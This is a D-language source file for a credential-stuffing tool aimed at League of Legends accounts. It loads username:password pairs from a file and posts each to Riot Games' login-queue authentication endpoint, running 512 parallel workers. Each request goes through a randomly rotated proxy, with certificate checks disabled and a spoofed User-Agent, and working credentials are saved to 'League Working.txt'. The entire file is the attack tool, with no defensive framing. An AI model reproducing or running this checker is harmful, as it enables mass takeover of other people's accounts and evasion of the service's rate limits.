module main;

import core.thread;
import etc.c.curl : CurlOption, CurlInfo, CurlError;
import std.array;
import std.conv;
import std.file;
import std.net.curl;
import std.parallelism;
import std.regex;
import std.stdio;
import std.string;
import std.uri;
import std.random;
import std.json;

void run(string user, string pass) {
	auto plines = readText("./proxies.txt").splitLines();
	auto proxy = chomp(plines[uniform(0, plines.length - 1)]);
	int trys = 0;
	bool done = false;
	while (!done) {
		try
		{
			if (trys >= 5 && proxy != null) {
				plines = readText("./proxies.txt").splitLines();
				proxy = chomp(plines[uniform(0, plines.length - 1)]);
				trys = 0;
			}
			writeln("Begin Checking Account! " ~ user);
			auto conn = HTTP();
			conn.handle.set(CurlOption.ssl_verifypeer, false);
			conn.addRequestHeader("User-Agent", "Mozilla/5.0 (Windows; U; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) AdobeAIR/3.7");
			conn.operationTimeout(dur!"seconds"(25));
			conn.handle.set(CurlOption.proxy, proxy);
			auto postData = "payload=" ~ encodeComponent("user=" ~ chomp(user) ~ ",password=" ~ chomp(pass));
			auto html = post("https://lq.na2.lol.riotgames.com/login-queue/rest/queue/authenticate", postData, conn);
			if (html.indexOf("\"status\":\"FAILED") == -1) {
				delete html;
				done = true;
				writeln("Account " ~ user ~ " works");
				std.file.append("./League Working.txt", user ~ ":" ~ pass ~ "\r\n");
				delete plines;
				return;
			} else {
				delete html;
				done = true;
				delete plines;
				return;
			}
		} catch (CurlException e) {
			plines = readText(getcwd() ~ "/proxies.txt").splitLines();
			done = false;
			proxy = chomp(plines[uniform(0, plines.length - 1)]);
		}
		trys += 1;
	}
}

int main(string[] args)
{
	auto work = new TaskPool(512);
	auto lines = readText("./accounts.txt").splitLines();
	foreach (account; work.parallel(lines)) {
		auto arr = split(account, ":");
		run(chomp(arr[0]), chomp(arr[1]));
		delete arr;
	}
	return 0;
}
